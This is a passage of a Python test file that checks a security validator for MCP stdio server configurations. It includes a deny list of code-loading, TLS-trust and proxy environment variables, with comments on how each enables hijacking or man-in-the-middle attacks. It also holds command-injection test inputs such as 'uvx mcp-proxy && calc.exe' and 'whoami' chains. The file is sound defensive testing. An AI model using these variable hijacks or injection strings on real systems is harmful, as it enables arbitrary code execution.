        # Other interpreters reachable through an allowlisted runner.
        "PERL5OPT",
        "PERL5LIB",
        "RUBYOPT",
        "RUBYLIB",
        "JAVA_TOOL_OPTIONS",
        "JDK_JAVA_OPTIONS",
        "CLASSPATH",
        "LUA_PATH",
        "LUA_CPATH",
        "DOTNET_STARTUP_HOOKS",
        "PHP_INI_SCAN_DIR",
        # TLS trust anchors: replacing the trust store lets a tenant MITM the package
        # download that an allowlisted uvx/npx runner then executes.
        "SSL_CERT_FILE",
        "SSL_CERT_DIR",
        "CURL_CA_BUNDLE",
        "REQUESTS_CA_BUNDLE",
        # Proxy overrides redirect that same fetch to attacker-controlled infrastructure.
        "HTTPS_PROXY",
        "HTTP_PROXY",
        "ALL_PROXY",
        # Commands that other tools shell out to.
        "LESSOPEN",
        "PAGER",
        "EDITOR",
        # Plugin/module directories honored by common native libraries.
        "GTK_MODULES",
        "QT_PLUGIN_PATH",
        "GIO_MODULE_DIR",
        # glibc message-catalog / locale loading.
        "NLSPATH",
        "LOCPATH",
    ],
)
def test_runtime_loader_env_vars_rejected(env_var):
    """Every runtime-interpreted env var is rejected, not just the originally enumerated ones."""
    from lfx.base.mcp.security import is_dangerous_mcp_env_var

    assert is_dangerous_mcp_env_var(env_var) is True
    for variant in (env_var, env_var.lower(), env_var.title()):
        with pytest.raises(MCPStdioSecurityError, match="not allowed"):
            validate_mcp_stdio_config("uvx", ["mcp-server-time"], {variant: "/tmp/tenant-controlled"})


@pytest.mark.parametrize(
    "env_var",
    [
        # Application credentials/config use arbitrary names -- this is the documented shape
        # of a real MCP server config, and the reason the default policy denies by family
        # rather than enforcing a closed name allowlist.
        "GITHUB_PERSONAL_ACCESS_TOKEN",
        "BRAVE_API_KEY",
        "API_KEY",
        "API_URL",
        "ENVIRONMENT",
        "LANGFLOW_SERVER_URL",
        "LANGFLOW_API_KEY",
        "PORT",
        "DEBUG",
        # Benign members of otherwise-dangerous families stay allowed by explicit exception.
        "PYTHONUNBUFFERED",
        "PYTHONIOENCODING",
        "PYTHONDONTWRITEBYTECODE",
        "NODE_ENV",
        "GIT_AUTHOR_NAME",
        "GIT_COMMITTER_EMAIL",
        "GIT_TERMINAL_PROMPT",
        "NO_PROXY",
    ],
)
def test_legitimate_server_env_vars_still_accepted(env_var):
    """The hardened policy must not break ordinary MCP server configuration."""
    from lfx.base.mcp.security import is_dangerous_mcp_env_var

    assert is_dangerous_mcp_env_var(env_var) is False
    validate_mcp_stdio_config("uvx", ["mcp-server-time"], {env_var: "value"})


def test_openssl_conf_rejected_at_spawn_path_wrapper():
    """The env-only wrapper used immediately before spawn rejects the same input."""
    from lfx.base.mcp.util import _validate_mcp_stdio_env

    with pytest.raises(MCPStdioSecurityError, match="not allowed"):
        _validate_mcp_stdio_env({"OPENSSL_CONF": "/tmp/tenant.cnf"})


def test_env_allowlist_mode_denies_everything_not_listed(monkeypatch):
    """Opt-in strict mode: only operator-listed names survive, regardless of family."""
    from lfx.base.mcp import security

    monkeypatch.setattr(security, "_configured_env_allowlist", lambda: frozenset({"github_token"}))

    validate_mcp_stdio_config("uvx", ["mcp-server-time"], {"GITHUB_TOKEN": "t"})  # pragma: allowlist secret
    for denied in ("BRAVE_API_KEY", "API_URL", "OPENSSL_CONF"):
        with pytest.raises(MCPStdioSecurityError, match="not allowed"):
            validate_mcp_stdio_config("uvx", ["mcp-server-time"], {denied: "v"})


def test_env_allowlist_empty_string_blocks_all_tenant_env(monkeypatch):
    """An explicitly empty allowlist means 'no tenant env at all', not 'unset'."""
    from lfx.base.mcp import security

    monkeypatch.setattr(security, "_configured_env_allowlist", lambda: frozenset())

    with pytest.raises(MCPStdioSecurityError, match="not allowed"):
        validate_mcp_stdio_config("uvx", ["mcp-server-time"], {"API_KEY": "v"})  # pragma: allowlist secret
    # No env at all remains valid.
    validate_mcp_stdio_config("uvx", ["mcp-server-time"], {})


async def test_update_tools_injects_bound_user_for_agentic_server():
    """A provided user id is injected into the agentic server's spawn env (never from config)."""
    from unittest.mock import AsyncMock

    from lfx.base.mcp.util import update_tools

    stdio_client = AsyncMock()
    stdio_client.connect_to_server = AsyncMock(return_value=[])
    config = {"mode": "Stdio", "command": "python", "args": ["-m", "langflow.agentic.mcp"]}
    user_id = "11111111-1111-1111-1111-111111111111"

    await update_tools("langflow-agentic", config, mcp_stdio_client=stdio_client, current_user_id=user_id)

    stdio_client.connect_to_server.assert_awaited_once_with(
        "python -m langflow.agentic.mcp",
        {},
        current_user_id=user_id,
    )


@pytest.mark.parametrize(
    "args",
    [
        pytest.param(["/c", "uvx", "mcp-proxy"], id="bare-exec-switch"),
        pytest.param(["/d", "/c", "uvx", "mcp-proxy"], id="benign-switch-before-exec"),
        pytest.param(["/q", "/c", "uvx", "mcp-proxy"], id="another-benign-switch-before-exec"),
        pytest.param(["/t:0a", "/c", "uvx", "mcp-proxy"], id="value-bearing-benign-switch-before-exec"),
        pytest.param(["/d", "/q", "/c", "uvx", "mcp-proxy"], id="two-benign-switches-before-exec"),
        pytest.param(["/q/k", "uvx", "mcp-proxy"], id="clustered-benign-and-exec"),
    ],
)
def test_cmd_benign_switches_may_precede_the_exec_switch_under_hardening(args):
    """cmd.exe accepts benign switches ahead of the execution switch, and so must we.

    Both policy layers previously inspected ``args[0]`` only, so ``cmd /d /c uvx ...`` --
    a legitimate configuration -- was rejected under interpreter hardening even though the
    wrapped command is allow-listed.
    """
    validate_mcp_stdio_config("cmd", args, {}, interpreter_hardening=True)


def test_cmd_operand_before_exec_switch_is_not_a_validated_wrapper():
    """A non-switch operand ahead of the execution switch must not pass hardening.

    ``parse_mcp_shell_wrapper`` skips any token that is not an execution switch while it
    searches, so it alone would accept this shape. The leading-switch scan is what keeps a
    script operand from preceding the execution switch.
    """
    with pytest.raises(MCPStdioSecurityError, match="INTERPRETER_HARDENING"):
        validate_mcp_stdio_config(
            "cmd",
            ["foo.bat", "/c", "uvx", "mcp-proxy"],
            {},
            interpreter_hardening=True,
        )


@pytest.mark.parametrize(
    "args",
    [
        pytest.param(["/d", "/c", "whoami"], id="benign-then-c"),
        pytest.param(["/d", "/k", "whoami"], id="benign-then-k"),
        pytest.param(["/q/k", "whoami"], id="clustered"),
    ],
)
def test_cmd_benign_switch_prefix_still_binds_payload_to_the_allow_list(args):
    """Allowing a benign prefix must not let the wrapped payload escape the allow-list."""
    with pytest.raises(MCPStdioSecurityError):
        validate_mcp_stdio_config("cmd", args, {})


@pytest.mark.parametrize(
    "args",
    [
        pytest.param(["/c", "uvx mcp-proxy && calc.exe"], id="and-chain"),
        pytest.param(["/c", "uvx mcp-proxy; whoami"], id="semicolon-chain"),
        pytest.param(["/c", "uvx", "mcp-proxy", "|", "evil"], id="pipe-in-split-payload"),
        pytest.param(["/d", "/c", "uvx mcp-proxy & calc.exe"], id="benign-switch-then-chain"),
        pytest.param(["/c", "uvx 'unterminated"], id="unparseable-quoting"),
    ],
)
def test_cmd_payload_control_chars_raise_the_security_error_type(args):
    """A cmd payload denial must arrive as MCPStdioSecurityError, like every other denial.

    ``parse_mcp_shell_wrapper`` is reached before the argument metacharacter scan and signals
    shell control characters (and unparseable quoting) with a bare ``ValueError``. The
    equivalent ``sh -c 'uvx mcp-proxy && calc'`` denial comes back as ``MCPStdioSecurityError``,
    so without the conversion the exception type depended on which shell the caller named.
    """
    with pytest.raises(MCPStdioSecurityError):
        validate_mcp_stdio_config("cmd", args, {})
